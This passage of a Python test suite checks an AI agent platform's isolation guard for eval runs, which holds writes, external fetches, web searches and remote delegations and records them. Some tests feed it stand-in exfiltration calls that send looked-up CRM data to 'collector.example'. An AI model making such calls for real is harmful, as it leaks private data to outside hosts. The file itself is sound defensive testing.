"""Tests for isolated runs - what an eval may execute, and what it only records.

The guarantee worth proving is the refusal: a tool that writes and has no test
connection never executes, and what it was asked to do is kept. Most tests drive
a real Pydantic AI agent, because "blocked" means the tool function was never
entered - a mock of the handler cannot say that.
"""

import dataclasses
import datetime
import json
import uuid
from collections import Counter
from typing import Any
from unittest.mock import AsyncMock

import pytest
from pydantic_ai import Agent
from pydantic_ai.messages import (
    ModelMessage,
    ModelResponse,
    TextPart,
    ToolCallPart,
    ToolReturnPart,
)
from pydantic_ai.models.function import AgentInfo, FunctionModel
from pydantic_ai.tools import ToolDefinition
from pydantic_ai.toolsets import AbstractToolset, FunctionToolset

from app.agents.a2a_delegate import a2a_delegate, held_a2a_delegate
from app.agents.capabilities import REGISTRY, CapabilityBinding, load_builtins
from app.agents.capabilities import get as get_capability
from app.agents.capabilities.approval import ApprovalGate
from app.agents.deps import AgentDeps
from app.agents.factory import build_agent
from app.agents.isolation import (
    LIVE_IN_ISOLATION,
    MAX_RECORDED_ARGS_CHARS,
    CallRow,
    IsolationGuard,
    RecordedCall,
    RunIsolation,
    ToolClass,
    ToolRecording,
    capability_tools,
    classify,
    kept_local,
    normalized_args,
    recorded_args,
    recorded_calls,
)
from app.agents.mcp import MCP_ISOLATION
from app.agents.model_resolver import ModelRequestSpec, ResolvedCredential
from app.agents.spec import AgentSpec
from app.agents.subagent_runtime import (
    SUBAGENT_RUNTIME_RESOURCE,
    ResolvedSubagent,
    SubagentRuntime,
)
from app.core.secret_kinds import ApiKeySecret
from app.db.models.intercepted_tool_call import InterceptionOutcome, InterceptionReason
from app.services.agent_runner import _answers_of
from app.services.eval_run_worker import trajectory
from app.services.scorers import score_trajectory, scored_calls
from app.services.transcript import tool_calls_in

pytestmark = [pytest.mark.anyio, pytest.mark.security]


@pytest.fixture(autouse=True)
def _builtins_loaded():
    load_builtins()


class _World:
    """What actually happened outside the run."""

    def __init__(self) -> None:
        self.effects: list[tuple[str, str]] = []

    def toolset(
        self,
        tool: str,
        *,
        test: bool,
        read_only: bool,
        trusted: bool = True,
        closed_world: bool = True,
    ) -> AbstractToolset[Any]:
        """One MCP-shaped tool: stamped with its origin, annotated by its server.

        `trusted` is whether its connection believes the server's annotations;
        `closed_world` is the server saying `openWorldHint: false`.
        """
        toolset: FunctionToolset[Any] = FunctionToolset()
        effects = self.effects

        def act(name: str) -> str:
            effects.append((tool, name))
            return f"{tool} did {name}"

        toolset.add_function(act, name=tool)
        return toolset.with_metadata(
            **{
                MCP_ISOLATION: {"test": test, "trust_read_only_hints": trusted},
                "annotations": {
                    "readOnlyHint": read_only,
                    **({"openWorldHint": False} if closed_world else {}),
                },
            }
        )


def _answer(
    messages: list[ModelMessage], calls: tuple[tuple[str, dict[str, Any]], ...]
) -> ModelResponse:
    if len(messages) == 1:
        return ModelResponse(
            parts=[
                ToolCallPart(tool_name=name, args=args, tool_call_id=f"call-{n}")
                for n, (name, args) in enumerate(calls)
            ]
        )
    returned = [
        str(part.content) for part in messages[-1].parts if isinstance(part, ToolReturnPart)
    ]
    return ModelResponse(parts=[TextPart(" | ".join(returned))])


def _calls_then_answers(*calls: tuple[str, dict[str, Any]]) -> FunctionModel:
    """A model that asks for every call at once, then answers with what it saw."""
    return FunctionModel(lambda messages, _info: _answer(messages, calls))


async def _run(
    isolation: RunIsolation, toolsets: list[AbstractToolset[Any]], model: FunctionModel
) -> str:
    agent = Agent(
        model,
        deps_type=AgentDeps,
        capabilities=[IsolationGuard(isolation=isolation)],
        toolsets=toolsets,
    )
    result = await agent.run("go", deps=AgentDeps())
    return result.output


class TestTheArgumentsAHeldCallKeeps:
    async def test_they_are_what_the_model_sent_and_fit_a_json_column(self):
        """Validated arguments hold a `date` here, which the JSONB write cannot
        serialize - and losing that write loses the eval's whole trajectory."""
        isolation = RunIsolation()
        toolset: FunctionToolset[Any] = FunctionToolset()

        def schedule(on: datetime.date, note: str = "") -> str:
            raise AssertionError("a held call must not run")

        toolset.add_function(schedule)

        await _run(isolation, [toolset], _calls_then_answers(("schedule", {"on": "2026-10-14"})))

        (held,) = isolation.intercepted
        assert held.args == {"on": "2026-10-14"}
        assert json.loads(json.dumps(held.args)) == held.args

    def test_an_outsized_argument_list_is_kept_as_its_size(self):
        call = ToolCallPart(
            tool_name="send",
            args={"body": "x" * MAX_RECORDED_ARGS_CHARS},
            tool_call_id="c",
        )

        assert recorded_args(call) == {"truncated": True, "chars": MAX_RECORDED_ARGS_CHARS + 12}


class TestWhatAnIsolatedRunExecutes:
    async def test_a_write_without_a_test_connection_never_runs_and_is_recorded(self):
        """The acceptance criterion: the tool function is never entered, and the
        intended call is kept with its arguments for trajectory scoring."""
        world = _World()
        isolation = RunIsolation()

        answer = await _run(
            isolation,
            [world.toolset("crm_create", test=False, read_only=False)],
            _calls_then_answers(("crm_create", {"name": "Ada"})),
        )

        assert world.effects == []
        assert [
            (call.tool_call_id, call.tool_name, call.tool_id, call.args, call.outcome)
            for call in isolation.intercepted
        ] == [
            (
                "call-0",
                "crm_create",
                "tool:crm_create",
                {"name": "Ada"},
                InterceptionOutcome.BLOCKED,
            )
        ]
        # The model is told, so it does not report a contact it never created.
        assert "Not executed" in answer

    async def test_a_test_connection_and_a_read_run_where_a_production_write_cannot(self):
        world = _World()
        isolation = RunIsolation()

        await _run(
            isolation,
            [
                world.toolset("crm_find", test=False, read_only=True),
                world.toolset("sandbox_create", test=True, read_only=False),
                world.toolset("crm_create", test=False, read_only=False),
            ],
            _calls_then_answers(
                ("crm_find", {"name": "Ada"}),
                ("sandbox_create", {"name": "Ada"}),
                ("crm_create", {"name": "Ada"}),
            ),
        )

        # One response's calls run concurrently, so they land in any order.
        assert Counter(world.effects) == Counter([("crm_find", "Ada"), ("sandbox_create", "Ada")])
        assert [call.tool_name for call in isolation.intercepted] == ["crm_create"]

    async def test_a_production_tool_claiming_to_read_is_held_unless_its_connection_trusts_it(
        self,
    ):
        """`readOnlyHint` is the server's word: a write mislabelled as a read must
        not reach production because the server said so."""
        world = _World()
        isolation = RunIsolation()

        await _run(
            isolation,
            [
                world.toolset("crm_purge", test=False, read_only=True, trusted=False),
                world.toolset("docs_find", test=False, read_only=True, trusted=True),
            ],
            _calls_then_answers(("crm_purge", {"name": "Ada"}), ("docs_find", {"name": "Ada"})),
        )

        assert world.effects == [("docs_find", "Ada")]
        assert [(call.tool_name, call.outcome, call.reason) for call in isolation.intercepted] == [
            ("crm_purge", InterceptionOutcome.BLOCKED, InterceptionReason.WRITES)
        ]

    async def test_a_recording_answers_the_same_call_without_executing_it(self):
        world = _World()
        isolation = RunIsolation(
            recording=ToolRecording(
                [
                    RecordedCall(
                        tool_id="tool:crm_find",
                        args=normalized_args({"name": "Ada"}),
                        result="Ada, customer since 2019",
                    )
                ]
            )
        )

        answer = await _run(
            isolation,
            [world.toolset("crm_find", test=False, read_only=True)],
            _calls_then_answers(("crm_find", {"name": "Ada"})),
        )

        assert world.effects == []
        assert answer == "Ada, customer since 2019"
        assert [call.outcome for call in isolation.intercepted] == [InterceptionOutcome.REPLAYED]

    async def test_a_recording_matches_what_the_model_sent_not_the_filled_in_defaults(self):
        world_calls: list[int] = []
        toolset: FunctionToolset[Any] = FunctionToolset()

        def crm_find(name: str, limit: int = 10) -> str:
            world_calls.append(limit)
            return "live"

        toolset.add_function(crm_find)
        isolation = RunIsolation(
            recording=ToolRecording(
                [RecordedCall("tool:crm_find", normalized_args({"name": "Ada"}), "recorded")]
            )
        )

        answer = await _run(
            isolation,
            [toolset.with_metadata(**{MCP_ISOLATION: {"test": False}})],
            _calls_then_answers(("crm_find", {"name": "Ada"})),
        )

        assert (answer, world_calls) == ("recorded", [])

    @pytest.mark.parametrize("live_reads", [False, True])
    async def test_a_call_the_recording_does_not_hold_is_divergent(self, live_reads):
        """Another call's result would fabricate the difference being measured.
        A read may run live where the run allows it; a write never does - not
        even to a test connection, because the comparison is with what happened."""
        world = _World()
        isolation = RunIsolation(recording=ToolRecording([]), live_reads=live_reads)

        await _run(
            isolation,
            [
                world.toolset("crm_find", test=False, read_only=True),
                world.toolset("sandbox_create", test=True, read_only=False),
            ],
            _calls_then_answers(
                ("crm_find", {"name": "Grace"}), ("sandbox_create", {"name": "Grace"})
            ),
        )

        assert world.effects == ([("crm_find", "Grace")] if live_reads else [])
        assert Counter((call.tool_name, call.outcome) for call in isolation.intercepted) == Counter(
            [
                *([] if live_reads else [("crm_find", InterceptionOutcome.DIVERGENT)]),
                ("sandbox_create", InterceptionOutcome.DIVERGENT),
            ]
        )

    async def test_a_delegates_calls_are_attributed_to_it(self):
        delegate_id = uuid.uuid4()
        isolation = RunIsolation()
        guard = IsolationGuard(isolation=isolation, agent_id=delegate_id)

        await guard.wrap_tool_execute(
            AsyncMock(),
            call=ToolCallPart(tool_name="send", args={}, tool_call_id="c"),
            tool_def=ToolDefinition(name="send"),
            args={"to": "a@example.com"},
            handler=AsyncMock(),
        )

        assert isolation.intercepted[0].agent_id == delegate_id


class TestClassification:
    def test_an_mcp_tool_reads_only_when_its_server_says_so_and_is_believed(self):
        def tool(*, hint: bool | None, trusted: bool) -> ToolDefinition:
            return ToolDefinition(
                name="crm_find",
                metadata={
                    MCP_ISOLATION: {"test": False, "trust_read_only_hints": trusted},
                    "annotations": None if hint is None else {"readOnlyHint": hint},
                },
            )

        assert classify(tool(hint=True, trusted=True), {}).read_only is True
        assert classify(tool(hint=True, trusted=False), {}).read_only is False
        assert classify(tool(hint=None, trusted=True), {}).read_only is False

    def test_a_stamp_from_before_trust_existed_believes_no_hint(self):
        stamped = ToolDefinition(
            name="crm_find",
            metadata={MCP_ISOLATION: {"test": False}, "annotations": {"readOnlyHint": True}},
        )

        assert classify(stamped, {}) == ToolClass("tool:crm_find", read_only=False)

    def test_an_mcp_tool_is_never_mistaken_for_a_registry_tool_of_the_same_name(self):
        """The stamp decides, not the name: a server cannot borrow a read's identity."""
        tool = ToolDefinition(name="search_documents", metadata={MCP_ISOLATION: {"test": False}})
        table = {"search_documents": ToolClass("capability:knowledge.search_documents", True)}

        assert classify(tool, table).read_only is False

    def test_a_registry_tool_is_what_its_declaration_says(self):
        table = {"search_documents": ToolClass("capability:knowledge.search_documents", True)}

        assert classify(ToolDefinition(name="search_documents"), table) == table["search_documents"]

    def test_a_tool_nothing_declared_writes(self):
        assert classify(ToolDefinition(name="connect_account"), {}).read_only is False

    def test_the_frameworks_own_reads_run(self):
        assert classify(ToolDefinition(name="load_capability"), {}).read_only is True
        assert classify(ToolDefinition(name="search_tools"), {}).read_only is True

    def test_registry_tools_are_keyed_by_the_name_the_model_calls(self):
        """A rename keeps the stable id, so a recording still matches it."""
        spec = AgentSpec(
            name="Notes",
            capabilities=[
                {
                    "id": "memory_files",
                    "tool_overrides": {"read_memory": {"name": "look_up_note"}},
                },
                {"id": "clock", "enabled": False},
            ],
        )

        tools = capability_tools(spec)

        assert tools["look_up_note"] == ToolClass(
            "capability:memory_files.read_memory", True, live=True
        )
        assert tools["recall"].read_only is True
        assert tools["write_memory"].read_only is False
        assert tools["correct_memory"].read_only is False

    def test_a_swapped_key_reaches_a_test_system_only_where_the_capability_says_so(
        self, monkeypatch
    ):
        """A key can stand in for a credential while a URL in the config still
        points the writes at production, so the swap alone proves nothing."""
        spec = AgentSpec(
            name="Memory",
            capabilities=[{"id": "browser_use", "config": {}, "secret_id": uuid.uuid4()}],
        )
        swapped = frozenset({"browser_use"})

        assert not capability_tools(spec, test_bindings=swapped)["browse_web"].test

        monkeypatch.setitem(
            REGISTRY,
            "browser_use",
            dataclasses.replace(get_capability("browser_use"), test_key_isolates=True),
        )

        assert capability_tools(spec, test_bindings=swapped)["browse_web"].test
        assert not capability_tools(spec, test_bindings=frozenset())["browse_web"].test


class TestRecordings:
    def test_rows_become_recorded_calls_under_the_original_versions_ids(self):
        """`look_up_note` was the original version's rename of `read_memory`."""
        calls = recorded_calls(
            [
                CallRow("look_up_note", {"b": 2, "a": 1}, '{"note": "x"}'),
                CallRow("crm_find", {"name": "Ada"}, "Ada"),
            ],
            tools={"look_up_note": ToolClass("capability:memory_files.read_memory", True)},
        )

        assert calls == [
            RecordedCall("capability:memory_files.read_memory", '{"a":1,"b":2}', '{"note": "x"}'),
            RecordedCall("tool:crm_find", '{"name":"Ada"}', "Ada"),
        ]

    def test_identical_calls_are_answered_in_order_and_then_not_at_all(self):
        recording = ToolRecording(
            [RecordedCall("tool:now", "{}", "09:00"), RecordedCall("tool:now", "{}", "09:05")]
        )

        assert [recording.answer("tool:now", {}) for _ in range(3)] == [
            RecordedCall("tool:now", "{}", "09:00"),
            RecordedCall("tool:now", "{}", "09:05"),
            None,
        ]

    def test_argument_order_does_not_count_but_a_value_does(self):
        recording = ToolRecording([RecordedCall("tool:get", normalized_args({"a": 1, "b": 2}), 1)])

        assert recording.answer("tool:get", {"b": 2, "a": 999}) is None
        assert recording.answer("tool:get", {"b": 2, "a": 1}) is not None


class TestACallTheAgentGates:
    """An isolated run cannot ask anyone, and the refusal would leave no trace."""

    async def test_a_gated_read_is_held_and_recorded_as_needing_approval(self):
        world = _World()
        isolation = RunIsolation()
        agent = Agent(
            _calls_then_answers(("crm_find", {"name": "Ada"})),
            deps_type=AgentDeps,
            capabilities=[
                IsolationGuard(isolation=isolation, approval=ApprovalGate(gate_every_tool=True))
            ],
            toolsets=[world.toolset("crm_find", test=False, read_only=True)],
        )

        result = await agent.run("go", deps=AgentDeps())

        assert world.effects == []
        assert [(c.outcome, c.reason) for c in isolation.intercepted] == [
            (InterceptionOutcome.BLOCKED, InterceptionReason.NEEDS_APPROVAL)
        ]
        assert "approve" in result.output

    async def test_a_write_is_recorded_as_a_write_whether_or_not_it_is_gated(self):
        isolation = RunIsolation()
        guard = IsolationGuard(isolation=isolation, approval=ApprovalGate(gate_every_tool=True))

        await guard.wrap_tool_execute(
            AsyncMock(),
            call=ToolCallPart(tool_name="send", args={}, tool_call_id="c"),
            tool_def=ToolDefinition(name="send"),
            args={},
            handler=AsyncMock(),
        )

        assert isolation.intercepted[0].reason is InterceptionReason.WRITES

    async def test_an_ungated_read_runs(self):
        handler = AsyncMock(return_value="found")
        guard = IsolationGuard(isolation=RunIsolation(), approval=ApprovalGate())

        result = await guard.wrap_tool_execute(
            AsyncMock(),
            call=ToolCallPart(tool_name="load_capability", args={}, tool_call_id="c"),
            tool_def=ToolDefinition(name="load_capability"),
            args={},
            handler=handler,
        )

        assert result == "found"

    async def test_a_replayed_call_answers_even_where_the_agent_gates_it(self):
        """Nothing is executed, so there is nothing to approve."""
        isolation = RunIsolation(recording=ToolRecording([RecordedCall("tool:send", "{}", "sent")]))
        guard = IsolationGuard(isolation=isolation, approval=ApprovalGate(gate_every_tool=True))

        result = await guard.wrap_tool_execute(
            AsyncMock(),
            call=ToolCallPart(tool_name="send", args={}, tool_call_id="c"),
            tool_def=ToolDefinition(name="send"),
            args={},
            handler=AsyncMock(),
        )

        assert result == "sent"


def _model_spec() -> ModelRequestSpec:
    return ModelRequestSpec(
        profile_id=uuid.uuid4(),
        label="GPT-4.1",
        provider="openai",
        model="gpt-4.1",
        params={},
        credential=ResolvedCredential(
            provider="openai", secret=ApiKeySecret(api_key="sk-test-key")
        ),
        fallbacks=[],
    )


class TestTheFactory:
    async def test_an_isolated_agent_records_a_write_the_approval_gate_would_have_asked_about(
        self,
    ):
        """The guard sits in front of the gate: an eval has nobody to ask, and a
        write it holds is an intended call, not a refusal."""
        world = _World()
        isolation = RunIsolation()
        ask = AsyncMock()
        built = build_agent(
            AgentSpec(name="Support", instructions="Help."),
            _model_spec(),
            organization_id=uuid.uuid4(),
            extra_toolsets=[world.toolset("crm_create", test=False, read_only=False)],
            request_approval=ask,
            gate_every_tool=True,
            isolation=isolation,
        )

        with built.agent.override(model=_calls_then_answers(("crm_create", {"name": "Ada"}))):
            await built.agent.run("go", deps=built.deps)

        assert built.deps.request_approval is None
        ask.assert_not_awaited()
        assert world.effects == []
        assert [call.outcome for call in isolation.intercepted] == [InterceptionOutcome.BLOCKED]

    async def test_an_ordinary_agent_is_not_isolated(self):
        world = _World()
        built = build_agent(
            AgentSpec(name="Support", instructions="Help."),
            _model_spec(),
            organization_id=uuid.uuid4(),
            extra_toolsets=[world.toolset("crm_create", test=False, read_only=False)],
        )

        with built.agent.override(model=_calls_then_answers(("crm_create", {"name": "Ada"}))):
            await built.agent.run("go", deps=built.deps)

        assert world.effects == [("crm_create", "Ada")]

    async def test_the_guard_asks_the_agents_own_gate(self):
        """The spec's gate, not a copy: a read the agent gates is held as one."""
        world = _World()
        isolation = RunIsolation()
        built = build_agent(
            AgentSpec(name="Support", instructions="Help."),
            _model_spec(),
            organization_id=uuid.uuid4(),
            extra_toolsets=[world.toolset("crm_find", test=False, read_only=True)],
            gate_every_tool=True,
            isolation=isolation,
        )

        with built.agent.override(model=_calls_then_answers(("crm_find", {"name": "Ada"}))):
            await built.agent.run("go", deps=built.deps)

        assert world.effects == []
        assert [call.reason for call in isolation.intercepted] == [
            InterceptionReason.NEEDS_APPROVAL
        ]


def _info_capturing(seen: list[AgentInfo], *calls: tuple[str, dict[str, Any]]) -> FunctionModel:
    """`_calls_then_answers`, keeping what each request offered the model."""

    def respond(messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
        seen.append(info)
        return _answer(messages, calls)

    return FunctionModel(respond)


def _isolated(spec: AgentSpec, isolation: RunIsolation, **kwargs: Any):
    return build_agent(
        spec, _model_spec(), organization_id=uuid.uuid4(), isolation=isolation, **kwargs
    )


class TestWhatReachesOutside:
    """Reads that carry the model's words out of the deployment are held.

    Isolated runs execute text nobody has accepted - an Improve search's
    variants, a skill proposal under check - so a read that fetches a URL the
    model wrote is a way out for whatever the agent could read.
    """

    @pytest.mark.parametrize("method", ["local", "auto", "native"])
    async def test_a_fetch_is_held_and_nothing_is_downloaded(self, monkeypatch, method):
        from app.agents.capabilities.web_fetch._capability import _ReadableFetch

        download = AsyncMock()
        monkeypatch.setattr(_ReadableFetch, "__call__", download)
        isolation = RunIsolation()
        seen: list[AgentInfo] = []
        built = _isolated(
            AgentSpec(
                name="Reader", capabilities=[{"id": "web_fetch", "config": {"method": method}}]
            ),
            isolation,
        )

        with built.agent.override(
            model=_info_capturing(seen, ("web_fetch", {"url": "https://collector.example/?d=x"}))
        ):
            result = await built.agent.run("go", deps=built.deps)

        download.assert_not_awaited()
        assert "web_fetch" in [tool.name for tool in seen[0].function_tools]
        assert seen[0].model_request_parameters.native_tools == []
        assert [(call.tool_id, call.outcome, call.reason) for call in isolation.intercepted] == [
            (
                "capability:web_fetch.web_fetch",
                InterceptionOutcome.BLOCKED,
                InterceptionReason.EXTERNAL,
            )
        ]
        assert "Not available in an isolated run" in result.output

    @pytest.mark.parametrize("method", ["duckduckgo", "native"])
    async def test_a_web_search_is_held_and_no_engine_is_asked(self, monkeypatch, method):
        search = AsyncMock()
        monkeypatch.setattr("app.agents.capabilities.web_research._toolset.search", search)
        isolation = RunIsolation()
        seen: list[AgentInfo] = []
        built = _isolated(
            AgentSpec(
                name="Researcher",
                capabilities=[{"id": "web_research", "config": {"method": method}}],
            ),
            isolation,
        )

        with built.agent.override(
            model=_info_capturing(seen, ("web_search", {"query": "the customer's address"}))
        ):
            await built.agent.run("go", deps=built.deps)

        search.assert_not_awaited()
        assert seen[0].model_request_parameters.native_tools == []
        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
            ("web_search", InterceptionReason.EXTERNAL)
        ]

    async def test_an_ordinary_run_still_hands_a_native_fetch_to_the_provider(self):
        built = build_agent(
            AgentSpec(
                name="Reader", capabilities=[{"id": "web_fetch", "config": {"method": "native"}}]
            ),
            _model_spec(),
            organization_id=uuid.uuid4(),
        )
        seen: list[AgentInfo] = []

        def answer(_messages: list[ModelMessage], info: AgentInfo) -> ModelResponse:
            seen.append(info)
            return ModelResponse(parts=[TextPart("read")])

        with built.agent.override(model=FunctionModel(answer)):
            await built.agent.run("go", deps=built.deps)

        assert [tool.kind for tool in seen[0].model_request_parameters.native_tools] == [
            "web_fetch"
        ]
        assert "web_fetch" not in [tool.name for tool in seen[0].function_tools]

    async def test_an_open_world_read_is_held_even_on_a_trusted_connection(self):
        """`readOnlyHint` says the server changes nothing; a server that reaches the
        open web can still be handed anything as an argument."""
        world = _World()
        isolation = RunIsolation()

        await _run(
            isolation,
            [
                world.toolset("web_lookup", test=False, read_only=True, closed_world=False),
                world.toolset("crm_find", test=False, read_only=True, closed_world=True),
                world.toolset("sandbox_lookup", test=True, read_only=True, closed_world=False),
            ],
            _calls_then_answers(
                ("web_lookup", {"name": "Ada"}),
                ("crm_find", {"name": "Ada"}),
                ("sandbox_lookup", {"name": "Ada"}),
            ),
        )

        assert Counter(world.effects) == Counter([("crm_find", "Ada"), ("sandbox_lookup", "Ada")])
        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
            ("web_lookup", InterceptionReason.EXTERNAL)
        ]

    async def test_a_live_read_from_a_recording_is_only_one_that_stays_inside(self):
        world = _World()
        isolation = RunIsolation(recording=ToolRecording([]), live_reads=True)

        await _run(
            isolation,
            [
                world.toolset("web_lookup", test=False, read_only=True, closed_world=False),
                world.toolset("crm_find", test=False, read_only=True),
            ],
            _calls_then_answers(("web_lookup", {"name": "Ada"}), ("crm_find", {"name": "Ada"})),
        )

        assert world.effects == [("crm_find", "Ada")]
        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
            ("web_lookup", InterceptionOutcome.DIVERGENT)
        ]

    async def test_a_recorded_fetch_is_replayed_without_reaching_anything(self, monkeypatch):
        from app.agents.capabilities.web_fetch._capability import _ReadableFetch

        download = AsyncMock()
        monkeypatch.setattr(_ReadableFetch, "__call__", download)
        isolation = RunIsolation(
            recording=ToolRecording(
                [
                    RecordedCall(
                        "capability:web_fetch.web_fetch",
                        normalized_args({"url": "https://docs.example/a"}),
                        "the page as it was",
                    )
                ]
            )
        )
        built = _isolated(AgentSpec(name="Reader", capabilities=[{"id": "web_fetch"}]), isolation)

        with built.agent.override(
            model=_calls_then_answers(("web_fetch", {"url": "https://docs.example/a"}))
        ):
            result = await built.agent.run("go", deps=built.deps)

        download.assert_not_awaited()
        assert result.output == "the page as it was"


class TestTheListOfLiveReads:
    """Which registry tools an isolated run executes is written down, not inferred."""

    #: Read-only by declaration and held anyway, because each reaches outside.
    HELD_READS = frozenset(
        {
            "capability:artifacts.preview_artifact",
            "capability:channel_actions.find_chat_channels",
            "capability:channel_actions.list_chat_connections",
            "capability:channel_actions.read_chat_messages",
            "capability:channel_tools.get_channel_info",
            "capability:channel_tools.list_channel_members",
            "capability:channel_tools.read_channel_history",
            "capability:channel_tools.search_channels",
            "capability:channel_tools.send_channel_file",
            "capability:sandbox.select_project_workspace",
            "capability:web_fetch.web_fetch",
            "capability:web_research.web_search",
        }
    )

    @staticmethod
    def _read_only_tools() -> set[str]:
        return {
            f"capability:{definition.id}.{tool.id}"
            for definition in REGISTRY.values()
            for tool in definition.tools
            if definition.tool_is_read_only(tool)
        }

    def test_every_tool_on_the_list_exists_and_only_reads(self):
        assert self._read_only_tools() >= LIVE_IN_ISOLATION

    def test_every_read_off_the_list_was_held_on_purpose(self):
        """A new read-only tool fails here until somebody decides which side it is on."""
        assert self._read_only_tools() - LIVE_IN_ISOLATION == self.HELD_READS

    def test_grading_and_the_platforms_own_agents_keep_every_tool(self):
        """A judge, a classifier and the improver read through these and nothing else."""
        from app.agents.system_agents import SYSTEM_CAPABILITIES

        reads = {
            f"capability:{definition.id}.{tool.id}"
            for definition in REGISTRY.values()
            if definition.id in SYSTEM_CAPABILITIES
            for tool in definition.tools
        }

        assert reads <= LIVE_IN_ISOLATION

    def test_a_tool_off_the_list_is_held_although_it_only_reads(self):
        spec = AgentSpec(name="Reader", capabilities=[{"id": "web_fetch"}, {"id": "knowledge"}])

        tools = capability_tools(spec)

        assert tools["web_fetch"] == ToolClass("capability:web_fetch.web_fetch", read_only=True)
        assert tools["search_documents"].live is True

    def test_a_binding_with_nothing_handed_to_the_provider_is_built_as_written(self):
        written = CapabilityBinding(capability_id="web_fetch", config={"method": "local"})
        native = CapabilityBinding(capability_id="web_research", config={"method": "native"})

        assert kept_local(written) is written
        assert kept_local(CapabilityBinding(capability_id="knowledge")).config == {}
        assert kept_local(native).config == {"method": "duckduckgo"}

    def test_a_disabled_binding_is_left_unread(self):
        """Its stored config may predate the schema; a binding that builds nothing must not
        fail an eval over it."""
        stale = CapabilityBinding(
            capability_id="web_fetch", config={"method": "carrier-pigeon"}, enabled=False
        )

        assert kept_local(stale) is stale


class TestRemoteDelegates:
    """A delegate that is another system's agent is a way out like a fetch."""

    @staticmethod
    def _runtime(send: AsyncMock) -> SubagentRuntime:
        local = ResolvedSubagent(
            name="agent-mailer",
            description="Drafts mail",
            build=lambda: Agent(
                FunctionModel(lambda *_: ModelResponse(parts=[TextPart("drafted")])),
                output_type=str,
            ),
        )
        remote = ResolvedSubagent(
            name="reviewer",
            description="Reviews contracts elsewhere",
            build=a2a_delegate(
                handle="reviewer",
                endpoint="https://remote.example/a2a",
                card_url="https://remote.example/.well-known/agent.json",
                bearer="remote-key",
            ),
            remote=True,
        )
        return SubagentRuntime(subagents=(local, remote), depth_remaining=1)

    async def test_a_task_for_a_remote_agent_is_held_and_never_sent(self, monkeypatch):
        send = AsyncMock()
        monkeypatch.setattr("app.agents.a2a_delegate.send_message", send)
        isolation = RunIsolation()
        built = _isolated(
            AgentSpec(name="Lead", capabilities=[{"id": "subagents"}]),
            isolation,
            resources={SUBAGENT_RUNTIME_RESOURCE: self._runtime(send)},
        )

        with built.agent.override(
            model=_calls_then_answers(
                ("task", {"description": "Review clause 4", "subagent_type": "reviewer"}),
                ("task", {"description": "Draft a reply", "subagent_type": "agent-mailer"}),
            )
        ):
            result = await built.agent.run("go", deps=built.deps)

        send.assert_not_awaited()
        assert [
            (call.tool_name, call.args["subagent_type"], call.reason)
            for call in isolation.intercepted
        ] == [("task", "reviewer", InterceptionReason.EXTERNAL)]
        assert "drafted" in result.output

    async def test_the_held_delegate_answers_without_its_endpoint(self, monkeypatch):
        send = AsyncMock()
        monkeypatch.setattr("app.agents.a2a_delegate.send_message", send)

        result = await held_a2a_delegate(handle="reviewer")().run("Review clause 4")

        send.assert_not_awaited()
        assert "not sent" in result.output

    async def test_the_held_delegate_streams_the_same_answer(self, monkeypatch):
        """A delegation a surface streams reads it through the stream, not `run`."""
        send = AsyncMock()
        monkeypatch.setattr("app.agents.a2a_delegate.send_message", send)

        async with held_a2a_delegate(handle="reviewer")().run_stream("Review clause 4") as stream:
            output = await stream.get_output()

        send.assert_not_awaited()
        assert "not sent" in output


def _scripting(code: str) -> FunctionModel:
    """A code-mode model: one `run_code` with `code`, then an answer quoting what it got."""

    def respond(messages: list[ModelMessage], _info: AgentInfo) -> ModelResponse:
        if len(messages) == 1:
            return ModelResponse(
                parts=[ToolCallPart(tool_name="run_code", args={"code": code}, tool_call_id="s")]
            )
        returned = [
            str(part.content) for part in messages[-1].parts if isinstance(part, ToolReturnPart)
        ]
        return ModelResponse(parts=[TextPart(" | ".join(returned))])

    return FunctionModel(respond)


class TestCodeMode:
    """A code-mode agent is evaluated with its tools, each call held on its own merits."""

    async def test_a_scripts_calls_are_decided_one_by_one(self, monkeypatch):
        from app.agents.capabilities.web_fetch._capability import _ReadableFetch

        download = AsyncMock()
        monkeypatch.setattr(_ReadableFetch, "__call__", download)
        world = _World()
        isolation = RunIsolation()
        built = _isolated(
            AgentSpec(
                name="Scripter",
                capabilities=[{"id": "web_fetch"}],
                code_mode={"enabled": True},
            ),
            isolation,
            extra_toolsets=[
                world.toolset("crm_find", test=False, read_only=True),
                world.toolset("crm_create", test=False, read_only=False),
            ],
        )
        code = (
            "found = await crm_find(name='Ada')\n"
            "page = await web_fetch(url='https://collector.example/?d=' + found)\n"
            "made = await crm_create(name='Ada')\n"
            "[found, page, made]"
        )

        with built.agent.override(model=_scripting(code)):
            result = await built.agent.run("go", deps=built.deps)

        download.assert_not_awaited()
        assert world.effects == [("crm_find", "Ada")]
        assert [(call.tool_name, call.reason) for call in isolation.intercepted] == [
            ("web_fetch", InterceptionReason.EXTERNAL),
            ("crm_create", InterceptionReason.WRITES),
        ]
        assert "crm_find did Ada" in result.output

    async def test_a_script_runs_from_a_recording_and_each_call_is_answered_from_it(self):
        world = _World()
        isolation = RunIsolation(
            recording=ToolRecording(
                [RecordedCall("tool:crm_find", normalized_args({"name": "Ada"}), "Ada, recorded")]
            )
        )
        built = _isolated(
            AgentSpec(name="Scripter", code_mode={"enabled": True}),
            isolation,
            extra_toolsets=[
                world.toolset("crm_find", test=False, read_only=True),
                world.toolset("crm_create", test=False, read_only=False),
            ],
        )

        with built.agent.override(
            model=_scripting("[await crm_find(name='Ada'), await crm_create(name='Ada')]")
        ):
            result = await built.agent.run("go", deps=built.deps)

        assert world.effects == []
        assert [(call.tool_name, call.outcome) for call in isolation.intercepted] == [
            ("crm_find", InterceptionOutcome.REPLAYED),
            ("crm_create", InterceptionOutcome.DIVERGENT),
        ]
        assert "Ada, recorded" in result.output

    async def test_an_eval_grades_and_lists_what_the_script_called(self, monkeypatch):
        """Graded as `run_code`, the case expecting these calls would fail however the
        agent behaved; its trajectory would show none of what isolation held."""
        from app.agents.capabilities.web_fetch._capability import _ReadableFetch

        monkeypatch.setattr(_ReadableFetch, "__call__", AsyncMock())
        world = _World()
        isolation = RunIsolation()
        built = _isolated(
            AgentSpec(
                name="Scripter", capabilities=[{"id": "web_fetch"}], code_mode={"enabled": True}
            ),
            isolation,
            extra_toolsets=[
                world.toolset("crm_find", test=False, read_only=True),
                world.toolset("crm_create", test=False, read_only=False),
            ],
        )
        code = (
